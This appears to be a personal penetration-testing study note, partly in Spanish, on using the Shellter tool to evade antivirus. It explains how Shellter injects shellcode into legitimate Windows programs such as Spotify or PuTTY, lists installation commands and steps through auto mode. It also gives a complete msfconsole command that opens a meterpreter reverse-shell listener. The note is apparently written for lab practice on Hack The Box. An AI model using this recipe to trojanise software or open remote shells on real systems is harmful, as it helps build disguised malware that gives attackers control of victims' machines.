## DESCRIPTION

Now that we have learned how to manually evade an AV via PowerShell, let's explore how to automate AV evasion payloads.

Shellter1 is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software. It uses a number of novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload.

While the details of the techniques Shellter uses are beyond the scope of this Module, it essentially performs a thorough analysis of the target PE file and the execution paths. It then determines where it can inject our shellcode without relying on traditional injection techniques that are easily caught by AV engines. Those include changing of PE file section permissions, creating new sections, etc.

Finally, Shellter attempts to use the existing PE Import Address Table (IAT)2 entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.

INSTALL

```
sudo apt install shellter
sudo apt install wine
dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```
#### Mas información
* https://github.com/ParrotSec/shellter


## EXPLOITATION

### OPTION 1: Auto mode

1. Seleccionamos el modo automático
![[Pasted image 20230510120705.png]]

2. Descargamos una aplicación donde vamos a encapsular el payload.
Algunas recomendadas son Spotify, Putty, etc.
![[Pasted image 20230510121321.png]]

3. Seleccionamos nuestra aplicación

![[Pasted image 20230510121514.png]]

4. Seleccionamos el modo Stealth y el modo de payload automaticos (se puede añadir uno custom)
![[Pasted image 20230510123251.png]]

5. Abrimos una reverse shell, en este caso de meterpreter

```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

Ejemplo Windows 11 con meterpreter:

![[Pasted image 20230510124219.png]]



## MACHINES

* Hack The Box: 
*
